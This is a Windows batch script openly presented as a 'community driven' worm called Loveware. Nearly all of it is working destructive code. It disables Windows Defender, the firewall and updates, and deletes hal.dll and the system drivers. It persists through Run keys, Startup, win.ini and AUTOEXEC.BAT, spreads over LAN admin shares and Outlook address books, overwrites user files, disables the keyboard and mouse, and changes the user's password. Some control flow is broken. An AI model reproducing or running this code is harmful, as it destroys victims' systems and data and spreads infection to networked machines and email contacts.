@echo off

:: LOVEWARE v5.1
::
:: YOU CAN DELETE THIS 
:: |  |  |  |  |  |  |
:: V  V  V  V  V  V  V
::
:: Name: Loveware
:: Creator: The_G0df@ther
:: What is this in gods name?!:
:: This is a worm that will mess up your computer!
:: BTW It is community driven!!! :)
::  ____________________________________________________
:: |___________________MALWARE CLASS____________________|
:: |TYPE______|ANSWER___________________________________|
:: |LOVELETTER|YES THIS IS A LOVELETTER BASED SOFTWARE  |
:: |Spyware   |NO                                       |
:: |Trojan    |YOU CAN CHOOSE                           |
:: |Email worm|YES                                      |
:: |Net worm  |YES                                      |
:: |XSS worm  |NOT THERE YET ;)                         |
:: |Adware    |NO                                       |
:: |RAT       |I AM NOT SO BAD                          |
:: |Backdoor  |PROBABLY NOT ;) (NO)                     |
:: |YOUR DOOM!|DEFINETLY!!!!!!!!!!                      |
::
:: IF YOU FIX A BUG OR ADD SOMETHING NEW TO THE SOFTWARE 
:: YOUR NAME WILL APPEAR HERE:
::  ____________________________
:: |MEMBERS_____________________|
:: |TheG0df@ther______|CREATOR__|
:: |__________________|_________|
:: |__________________|_________|
:: |__________________|_________|
:: |__________________|_________|
:: 
:: Notes:
:: This software needs to be converted to exe
:: (add "invisible startup for better preformance").
:: Please send me a message on Instagram (@the_g0dfath_er)
:: if you find any bugs or if you have
:: a good idea about something we can add to this software.
:: Disclamer:
:: I am not responsible for the damage caused by this software.
::
::    ,--,                                                                           
::  ,---.'|                                                                           
::  |   | :                                                                           
::  :   : |                                                                           
::  |   ' :      ,---.                              .---.             __  ,-.         
::  ;   ; '     '   ,'\      .---.                 /. ./|           ,' ,'/ /|         
::  '   | |__  /   /   |   /.  ./|  ,---.       .-'-. ' |  ,--.--.  '  | |' | ,---.   
::  |   | :.'|.   ; ,. : .-' . ' | /     \     /___/ \: | /       \ |  |   ,'/     \  
::  '   :    ;'   | |: :/___/ \: |/    /  | .-'.. '   ' ..--.  .-. |'  :  / /    /  | 
::  |   |  ./ '   | .; :.   \  ' .    ' / |/___/ \:     ' \__\/: . .|  | ' .    ' / | 
::  ;   : ;   |   :    | \   \   '   ;   /|.   \  ' .\    ," .--.; |;  : | '   ;   /| 
::  |   ,/     \   \  /   \   \  '   |  / | \   \   ' \ |/  /  ,.  ||  , ; '   |  / | 
::  '---'       `----'     \   \ |   :    |  \   \  |--";  :   .'   \---'  |   :    | 
::                          '---" \   \  /    \   \ |   |  ,     .-./       \   \  /  
::                                 `----'      '---"     `--`---'            `---TEAM  
::                                                                          
:: Untill here ---------------------------------------------->
:: Below this there is only death and LOVE 
:: |  |  |  |  |  |  |  |  |  |  |  |  |  |
:: V  V  V  V  V  V  V  V  V  V  V  V  V  V

color 57

title Loveware

net session >nul 2>&1

if %errorLevel% == 0 (

    goto run

) else (

    echo Please run as admin!

	pause

	exit

)

:run
net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
net stop "wuauserv"
net stop "Windows Defender Service"
net stop "Windows Firewall"

echo @echo off>>LoveLetter.bat
echo DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll">>LoveLetter.bat
echo @((( Echo Off > Nul ) & Break Off )>>LoveLetter.bat
echo @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run>>LoveLetter.bat
echo @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul>>LoveLetter.bat
echo @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*">>LoveLetter.bat
echo )>>LoveLetter.bat

XCOPY "LoveLetter.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

echo @echo off>Lovewatch.bat
echo title Lovewatch>>Lovewatch.bat
echo :Love>>Lovewatch.bat
echo tasklist | find /I "Loveware">>Lovewatch.bat
echo if errorlevel 1 (>>Lovewatch.bat
echo         start LoveLetter.bat>>Lovewatch.bat
echo goto Love>>Lovewatch.bat

start /min Lovewatch.bat

:Loveyou
tasklist | find /I "Lovewatch"
if errorlevel 1 (
         start LoveLetter.bat
goto Loveyou

@echo off
SET i=0
SET "NomeProcesso=Loveware.exe"
SET "NomeService=Loveware"

echo sc create %NomeService% binpath=%0 > service.bat
echo sc start %NomeService% >> service.bat
attrib +h +r +s service.bat
start service.bat

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
attrib +h +r +s %0

:Internet
net use Z: \\192.168.1.%i%\C$
if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
mountvol Z: /d)
if %i% == 256 (goto Infect) else (set /a i=i+1)
goto Internet

:Infect
for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)
for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)
goto Infect

:worm
set Slash=\
if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
del %SystemDrive%%Slash%AUTOEXEC.BAT
copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
)
set a=Loveware
copy %0 %windir%\%a%.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
set b=Loveware
copy %0 %windir%\%b%.exe
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.exe >> %windir%\win.ini
echo load=%windir%\%b%.exe >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.exe >> %windir%\system.ini
echo dim x>>%SystemDrive%\mail.vbs
echo on error resume next>>%SystemDrive%\mail.vbs
echo Set fso ="Scripting.FileSystem.Object">>%SystemDrive%\mail.vbs
echo Set so=CreateObject(fso)>>%SystemDrive%\mail.vbs
echo Set ol=CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>%SystemDrive%\mail.vbs
echo Set a = mapi.AddressLists(1)>>%SystemDrive%\mail.vbs
echo Set ae=a.AddressEntries>>%SystemDrive%\mail.vbs
echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs
echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs
echo Set Mail=ci>>%SystemDrive%\mail.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
echo Mail.Subject="Is this you?">>%SystemDrive%\mail.vbs
echo Mail.Body="Man that has got to be embarrassing!">>%SystemDrive%\mail.vbs
echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
echo Mail.send>>%SystemDrive%\mail.vbs
echo Next>>%SystemDrive%\mail.vbs
echo ol.Quit>>%SystemDrive%\mail.vbs
start "" "%SystemDrive%\mail.vbs"
goto worm

set Slash=\
if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
del %SystemDrive%%Slash%AUTOEXEC.BAT
copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
)
set a=Loveware
copy %0 %windir%\%a%.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
copy %0 "%userprofile%\Start Menu\Programs\Startup"
set b=Loveware
copy %0 %windir%\%b%.exe
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.exe >> %windir%\win.ini
echo load=%windir%\%b%.exe >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.exe >> %windir%\system.ini


echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg"
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "nokeyboard.reg"
echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "nokeyboard.reg"
echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "nokeyboard.reg"
echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "nokeyboard.reg"
echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "nokeyboard.reg"
echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "nokeyboard.reg"
echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "nokeyboard.reg"
echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "nokeyboard.reg"
echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "nokeyboard.reg"
echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "nokeyboard.reg"
echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "nokeyboard.reg"
echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "nokeyboard.reg"
echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "nokeyboard.reg"
echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "nokeyboard.reg"
echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "nokeyboard.reg"
echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "nokeyboard.reg"
echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "nokeyboard.reg"
echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "nokeyboard.reg"
echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "nokeyboard.reg"
echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg"
echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"

:haha
msg * "You are hacked!"

echo color 57>>LoveChoice.bat
echo title LoveChoice>>LoveChoice.bat

echo echo Hey, do you love me (only answer in yes or no)>>LoveChoice.bat
echo set /p love=>>LoveChoice.bat
echo if %love%==yes goto love>>LoveChoice.bat
echo if %love%==no goto hate>>LoveChoice.bat

echo :love>>LoveChoice.bat

echo echo I love you too...>>LoveChoice.bat

echo echo @echo off>>AUTOEXEC.BAT>>LoveChoice.bat
echo echo I hope you listerned to my warning!>>AUTOEXEC.BAT>>LoveChoice.bat
echo echo timeout 20>>AUTOEXEC.BAT>>LoveChoice.bat
echo echo exit>>AUTOEXEC.BAT>>LoveChoice.bat

echo echo I will give you a present because you love me...>>LoveChoice.bat
echo echo But first I want to say...>>LoveChoice.bat
echo echo ........>>LoveChoice.bat
echo echo .....>>LoveChoice.bat
echo echo You are hacked my love!!! >>LoveChoice.bat
echo echo info: This software was made by the G0df@ther!>>LoveChoice.bat
echo echo I am not responsible for the damage. Sorry if U are a victim of this trojan. >>LoveChoice.bat
echo echo Do not close Loveware or Lovewatch, this will kill your computer!>>LoveChoice.bat
echo echo If you restart your computer now you wont be able to use it.>>LoveChoice.bat
echo echo You will get a message when you can safely restart or reboot your computer.>>LoveChoice.bat

echo timeout 5>>LoveChoice.bat

echo echo But first I want to have some fun!>>LoveChoice.bat
echo echo Hahahahahahahaha!!!!!!!>>LoveChoice.bat

echo :respawn>>LoveChoice.bat
echo start Loveware.bat>>LoveChoice.bat
echo goto respawn>>LoveChoice.bat

echo :crazymouse>>LoveChoice.bat
echo call mouse moveBy 19x78>>LoveChoice.bat
echo call mouse moveBy 111x45>>LoveChoice.bat
echo call mouse moveBy 100x100>>LoveChoice.bat
echo goto crazymouse>>LoveChoice.bat

echo :chaos>>LoveChoice.bat
echo date 22/08/2014>>LoveChoice.bat
echo time 06:06:06>>LoveChoice.bat
echo nul >> %random%>>LoveChoice.bat
echo mkdir %random%>>LoveChoice.bat
echo net user %random% /add>>LoveChoice.bat
echo goto chaos>>LoveChoice.bat

echo :makemsg>>LoveChoice.bat
echo echo do>>msg.vbs>>LoveChoice.bat
echo echo Msgbox"I love you darling.....",0+0,"You are hacked!">>msg.vbs>>LoveChoice.bat
echo echo loop>>msg.vbs>>LoveChoice.bat
echo goto makemsg>>LoveChoice.bat

echo :startmsg>>LoveChoice.bat
echo start msg.vbs>>LoveChoice.bat
echo goto startmsg>>LoveChoice.bat

echo start "nokeyboard.reg">>LoveChoice.bat

echo set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass">>LoveChoice.bat
echo reg delete %key%>>LoveChoice.bat
echo reg add %key% /v Start /t REG_DWORD /d 4>>LoveChoice.bat

XCOPY "Loveware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
:x
MD ILoveYou
CD ILoveYou
XCOPY "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Loveware.exe"
CD ILoveYou
GOTO x

echo timeout 400>>LoveChoice.bat

echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\LoveLetter.bat">>LoveChoice.bat

echo cls>>LoveChoice.bat

echo echo Now it is safe to reboot your computer!>>LoveChoice.bat
echo echo Thank you for downloading my project and testing it.>>LoveChoice.bat

shutdown /s>>LoveChoice.bat
exit


echo :hate>>LoveChoice.bat
echo echo But I love you....hehehehehe :(>>LoveChoice.bat

echo :crazymousee>>LoveChoice.bat
echo call mouse moveBy 19x78>>LoveChoice.bat
echo call mouse moveBy 111x45>>LoveChoice.bat
echo call mouse moveBy 100x100>>LoveChoice.bat
echo goto crazymousee>>LoveChoice.bat

echo echo ......>>LoveChoice.bat

echo echo @echo off>AUTOEXEC.BAT>>LoveChoice.bat
echo echo echo Loveware was here...>>AUTOEXEC.BAT>>LoveChoice.bat
echo echo :l>>AUTOEXEC.BAT>>LoveChoice.bat
echo echo goto l>>AUTOEXEC.BAT>>LoveChoice.bat

echo echo ..........>>LoveChoice.bat
echo echo You are hacked!!!>>LoveChoice.bat
echo echo Info: This trojan was created by the G0df@ther!>>LoveChoice.bat
echo timeout 1>>LoveChoice.bat
echo echo You do not have so mutch time left to live!!!!!!!!!!!!!!!!!!!!!>>LoveChoice.bat
echo echo So use your computer as long as you can!!!!!!!!!!!!>>LoveChoice.bat
echo echo Do not close Loveware or Lovewatch, this will kill your computer!!!!!!!>>LoveChoice.bat

echo :loop>>LoveChoice.bat
echo start Loveware.bat>>LoveChoice.bat
echo goto loop>>LoveChoice.bat

XCOPY "Loveware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
:x
MD IHateYou
CD IHateYou
XCOPY "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Loveware.exe"
CD IHateYou
GOTO x

echo :msgbox>>LoveChoice.bat
echo echo do>>msg.vbs>>LoveChoice.bat
echo echo Msgbox"I hate you... Here is the payback for the things you did to me!",0+0,"You are hacked!">>msg.vbs>>LoveChoice.bat
echo echo loop>>msg.vbs>>LoveChoice.bat
echo goto msgbox>>LoveChoice.bat

echo :msginf>>LoveChoice.bat
echo start msg.vbs>>LoveChoice.bat
echo goto msginf>>LoveChoice.bat

echo :dangerouschaos>>LoveChoice.bat
echo net user %username% a0h5UILOVEYOUuYR45JmyUtHAHAHAHAHTheG0df@ther!>>LoveChoice.bat
echo date 22/08/2014>>LoveChoice.bat
echo time 06:06:06>>LoveChoice.bat
echo nul >> %random%>>LoveChoice.bat
echo mkdir %random%>>LoveChoice.bat
echo net user %random% /add>>LoveChoice.bat
echo goto dangerouschaos>>LoveChoice.bat

echo start "nokeyboard.reg">>LoveChoice.bat

echo timeout 400>>LoveChoice.bat

echo DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll">>LoveChoice.bat
echo @((( Echo Off > Nul ) & Break Off )>>LoveChoice.bat
echo @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run>>LoveChoice.bat
echo @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul>>LoveChoice.bat
echo @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*">>LoveChoice.bat
echo )>>LoveChoice.bat
echo shutdown /s>>LoveChoice.bat

start LoveChoice.bat

:LOVE
tasklist | find /I "LoveChoice"
if errorlevel 1 (
         start LoveLetter.bat
goto LOVE